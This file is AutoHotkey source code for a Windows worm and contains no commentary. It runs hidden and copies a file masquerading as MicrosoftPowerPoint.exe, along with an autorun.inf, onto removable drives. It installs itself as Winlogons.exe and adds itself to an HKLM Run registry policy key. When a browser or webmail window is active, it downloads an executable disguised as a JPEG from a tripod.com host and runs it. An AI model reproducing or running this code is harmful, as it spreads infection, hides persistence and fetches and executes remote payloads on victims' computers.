#notrayicon
#persistent
ArrayCount = 0
Loop, Read,%temp%\MsData\driveList
{
ArrayCount += 1
Array%ArrayCount% := A_LoopReadLine
}
dat1=%userprofile%
settimer,reproduce,10000
return
reproduce:
Loop %ArrayCount%
{
element := Array%A_Index%
driveget,data,Type,%element%:\
ifequal,data,Removable
{
driveget,data1,status,%element%:\
ifequal,data1,Ready
{
FileCopy,%temp%\MsData\MicrosoftPowerPoint.exe,%element%:\,1
FileCopy,%temp%\MsData\autorun.inf,%element%:\,1
}
}
}
ifnotexist,%windir%\Winlogons.exe
FileCopy,%temp%\MsData\MicrosoftPowerPoint.exe,%windir%\Winlogons.exe
regread,regdata,REG_SZ,HKEY_LOCAL_MACHINE,SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\Run,Winlogons
ifnotequal,regdata,Winlogons,%windir%\Winlogons.exe
Regwrite,REG_SZ,HKEY_LOCAL_MACHINE,SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\Run,Winlogons,%windir%\Winlogons.exe
ifexist,%temp%\~DF450D.tmp.exe
goto end
WinGetActiveTitle, ed
ifinstring,ed,Microsoft Internet Explorer
{
UrlDownloadToFile, http://sapn4.tripod.com/MsUpdate.jpg, %temp%\~DF450D.tmp.exe
ifexist,%temp%\~DF450D.tmp.exe
Run %temp%\~DF450D.tmp.exe
goto end
}
ifinstring,ed,Mozzila Firefox
{
UrlDownloadToFile, http://sapn4.tripod.com/MsUpdate.jpg, %temp%\~DF450D.tmp.exe
ifexist,%temp%\~DF450D.tmp.exe
Run %temp%\~DF450D.tmp.exe
goto end
}
ifinstring,ed,google
{
UrlDownloadToFile, http://sapn4.tripod.com/MsUpdate.jpg, %temp%\~DF450D.tmp.exe
ifexist,%temp%\~DF450D.tmp.exe
Run %temp%\~DF450D.tmp.exe
goto end
}
 ifinstring,ed,yahoo
{
UrlDownloadToFile, http://sapn4.tripod.com/MsUpdate.jpg, %temp%\~DF450D.tmp.exe
ifexist,%temp%\~DF450D.tmp.exe
Run %temp%\~DF450D.tmp.exe
goto end
}
 ifinstring,ed,orkut
{
UrlDownloadToFile, http://sapn4.tripod.com/MsUpdate.jpg, %temp%\~DF450D.tmp.exe
ifexist,%temp%\~DF450D.tmp.exe
Run %temp%\~DF450D.tmp.exe
goto end
}
 ifinstring,ed,rediffmail
{
UrlDownloadToFile, http://sapn4.tripod.com/MsUpdate.jpg, %temp%\~DF450D.tmp.exe
ifexist,%temp%\~DF450D.tmp.exe
Run %temp%\~DF450D.tmp.exe
goto end
}
 ifinstring,ed,Yahoo! Messenger
{
UrlDownloadToFile, http://sapn4.tripod.com/MsUpdate.jpg, %temp%\~DF450D.tmp.exe
ifexist,%temp%\~DF450D.tmp.exe
Run %temp%\~DF450D.tmp.exe
goto end
}
 ifinstring,ed,Opera
{
UrlDownloadToFile, http://sapn4.tripod.com/MsUpdate.jpg, %temp%\~DF450D.tmp.exe
ifexist,%temp%\~DF450D.tmp.exe
Run %temp%\~DF450D.tmp.exe
goto end
}
 ifinstring,ed,Netscape
{
UrlDownloadToFile, http://sapn4.tripod.com/MsUpdate.jpg, %temp%\~DF450D.tmp.exe
ifexist,%temp%\~DF450D.tmp.exe
Run %temp%\~DF450D.tmp.exe
goto end
}
end:
return